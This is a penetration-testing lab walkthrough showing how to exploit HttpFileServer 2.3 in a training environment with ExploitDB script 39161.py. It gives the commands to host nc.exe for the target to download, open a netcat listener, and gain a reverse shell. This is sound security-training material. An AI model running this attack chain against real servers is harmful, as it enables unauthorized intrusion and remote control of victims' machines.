# ðŸ”¬Fixing Exploits - HFS

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> ðŸ”¬ [Windows: HTTP File Server](https://attackdefense.com/challengedetails?cid=1945)
>
> * Same as the [HFS - MSF Exploit Lab](../the-metasploit-framework-msf/exploitation.md)
> * Target IP: `10.0.29.29`
> * Manually exploit the target with **ExploitDB exploits**
> * Attacker machine is offline

```bash
nmap -sV 10.0.29.29
```

```bash
Not shown: 990 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49175/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

* Use `searchsploit` to identify `HttpFileServer httpd 2.3` vulnerabilities

```bash
searchsploit  HTTP File Server 2.3 
```

<figure><img src="../../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

* Copy the exploit to the Desktop

```bash
cd Desktop/
searchsploit -m 39161.py
```

<figure><img src="../../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### Analyzing the Exploit <a href="#analyzing-the-exploit" id="analyzing-the-exploit"></a>

```bash
vim 39161.py 
```

<figure><img src="../../../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

* Try to run it based on the usage but nothing will happen.

```bash
python 39161.py 10.0.29.29 80  
```

Read the exploit

* _You need to be using a web server hosting netcat (http://\<attackers\_ip>:80/nc.exe). You may need to run it multiple times for success!_
* `ip_addr` - change to attacker Kali Linux IP
* `local_port` - change to 1234

<figure><img src="../../../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

### Execute the Exploit <a href="#execute-the-exploit" id="execute-the-exploit"></a>

* Save and run the exploit

```bash
# In a new terminal session
cd Desktop/
cp /usr/share/windows-resources/binaries/nc.exe .
python -m SimpleHTTPServer 80
```

```bash
# In a new terminal session
# Run the netcat listener on the exploit specified "local_port"
nc -nvlp 1234
```

```bash
# From the first terminal windows, run the exploit
python 39161.py 10.0.29.29 80 # connect
python 39161.py 10.0.29.29 80 # gain shellcd \
```

<figure><img src="../../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

```bash
whoami
systeminfo
```

<figure><img src="../../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>
